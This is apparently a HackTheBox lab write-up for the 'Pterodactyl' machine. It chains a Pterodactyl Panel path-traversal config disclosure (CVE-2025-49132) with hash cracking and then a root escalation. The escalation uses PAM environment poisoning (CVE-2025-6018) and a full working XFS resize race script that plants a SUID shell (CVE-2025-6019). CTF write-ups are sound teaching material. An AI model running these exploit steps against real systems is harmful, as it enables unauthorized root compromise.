# Pterodactyl

**Platform:** HackTheBox
**OS:** Linux
**Tags:** CVE-2025-49132, Path Traversal, Config Disclosure, Hash Cracking, CVE-2025-6018, PAM Poisoning, Polkit Bypass, CVE-2025-6019, XFS Race Condition, SUID, Privilege Escalation
**Date:** 2026-05-15

Pterodactyl Panel exposed on a subdomain. CVE-2025-49132 path traversal leaks the Laravel app key and database credentials unauthenticated. Cracking the extracted hash gives SSH access. Privilege escalation chains CVE-2025-6018 (PAM environment poisoning to fake a graphical polkit session) with CVE-2025-6019 (XFS resize race condition to land a SUID shell as root).

## 1. Enumeration

Two ports. SSH and nginx on 80.

```bash
nmap -sV -sC -p- <TARGET_IP>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6
80/tcp open  http    nginx 1.21.5
```

Port 80 redirects to `http://pterodactyl.htb/`. Added `pterodactyl.htb` and `panel.pterodactyl.htb` to `/etc/hosts`.

Gobuster on the main domain returned `index.php` and `phpinfo.php`. Subdomain fuzzing with ffuf revealed a panel subdomain:

```bash
ffuf -u http://pterodactyl.htb -H 'Host: FUZZ.pterodactyl.htb' -w subdomains.txt -ac

panel    [Status: 200]
```

`http://panel.pterodactyl.htb` exposes a Pterodactyl Panel login page.

## 2. Foothold: CVE-2025-49132

Pterodactyl Panel versions below v1.11.11 are vulnerable to path traversal via the locale endpoint, allowing unauthenticated config disclosure, leaking the Laravel `APP_KEY` and database credentials.

```bash
git clone https://github.com/str1keboo/CVE-2025-49132
python3 CVE-2025-49132-PoC.py test http://panel.pterodactyl.htb
# [+] Target appears vulnerable

python3 CVE-2025-49132-PoC.py dump http://panel.pterodactyl.htb
```

Findings:
- APP_KEY: Laravel app key, usable for session forgery
- DB credentials: MySQL connection string with panel database access

Using the app key and database access, user password hashes were extracted from the panel database and cracked to obtain SSH credentials.

```bash
ssh <user>@<TARGET_IP>
```

**Result:** Initial access as user.

## 3. Privilege Escalation: CVE-2025-6018 (PAM Environment Poisoning)

Checked sudo permissions first:

```bash
sudo -l
# (ALL) ALL
```

The `targetpw` option in sudoers means sudo asks for root's password - not ours. Dead end without it.

The installed PAM version is vulnerable to CVE-2025-6018:

```bash
rpm -q pam
# Version : 1.3.0 / Release : 150000.6.66.1
```

openSUSE's PAM config loads `pam_env.so` with `user_readenv=1`, which reads `~/.pam_environment` on login. Injecting `XDG_SEAT` and `XDG_VTNR` tricks `pam_systemd` into registering the SSH session as a local graphical session - granting polkit `allow_active` permissions.

```bash
cat > ~/.pam_environment << 'EOF'
XDG_SEAT DEFAULT=seat0
XDG_VTNR DEFAULT=1
EOF
```

Log out and back in, then verify the polkit session is active:

```bash
gdbus call --system --dest org.freedesktop.login1 \
  --object-path /org/freedesktop/login1 \
  --method org.freedesktop.login1.Manager.CanReboot
# ('yes',)
```

**Result:** Polkit `allow_active` actions now available, including UDisks2 filesystem operations.

## 4. Privilege Escalation: CVE-2025-6019 (XFS Resize Race Condition)

`libblockdev`'s `bd_fs_resize()` temporarily mounts XFS filesystems with NULL options - no `nosuid`, no `nodev`. A SUID binary executing from the mounted image during this window runs with root privileges.

**On Kali (as root)**: build the XFS image with SUID bash embedded:

```bash
scp <user>@<TARGET_IP>:/usr/bin/bash /tmp/victim_bash

dd if=/dev/zero of=/tmp/xfs.img bs=1M count=300
mkfs.xfs -f -i exchange=0 -n parent=0 /tmp/xfs.img
mount -o loop,suid /tmp/xfs.img /tmp/mnt
cp /tmp/victim_bash /tmp/mnt/bash
chown root:root /tmp/mnt/bash
chmod 4755 /tmp/mnt/bash
umount /tmp/mnt

scp /tmp/xfs.img <user>@<TARGET_IP>:/tmp/xfs.img
```

**On the target** - race the resize window:

```bash
cat > /tmp/pwn.sh << 'EOF'
#!/bin/bash
killall -KILL gvfs-udisks2-volume-monitor 2>/dev/null
rm -f /tmp/r

while true; do
  for f in /tmp/blockdev*/bash; do
    [ -f "$f" ] && $f -p -c 'cp /bin/bash /tmp/r; chown root:root /tmp/r; chmod 4755 /tmp/r' \
      && echo "[+] PWNED" && break 2
  done
done &
WATCHER_PID=$!

LOOP_OUT=$(udisksctl loop-setup -f /tmp/xfs.img --no-user-interaction)
LOOP=$(echo "$LOOP_OUT" | grep -oP '/dev/loop\d+')

gdbus call --system --dest org.freedesktop.UDisks2 \
  --object-path "/org/freedesktop/UDisks2/block_devices/$(basename $LOOP)" \
  --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'

sleep 1
kill $WATCHER_PID 2>/dev/null
/tmp/r -p
EOF
chmod +x /tmp/pwn.sh
bash /tmp/pwn.sh
```

```
[*] Loop: /dev/loop0
[+] PWNED
r-4.4# whoami
root
```

**Result:** Root shell obtained.

## 5. Flags

- User: `redacted`
- Root: `redacted`
